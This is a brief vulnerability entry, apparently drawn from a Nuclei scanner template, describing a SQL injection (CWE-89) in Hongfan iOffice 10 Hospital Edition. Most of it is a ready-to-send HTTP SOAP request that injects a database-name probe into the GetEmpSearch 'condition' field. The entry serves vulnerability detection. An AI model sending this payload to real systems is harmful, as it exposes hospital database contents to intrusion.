# Vulnerability: Hongfan OA udfmr.asmx - SQL injection
**Classification:** CWE-89
**Source:** Nuclei Template (`hongfan-ioffice-sqli.yaml`)

## Description
There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8
SOAPAction: http://tempuri.org/ioffice/udfmr/GetEmpSearch

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
      <condition>1=db_name(1)</condition>
    </GetEmpSearch>
  </soap:Body>
</soap:Envelope>
```

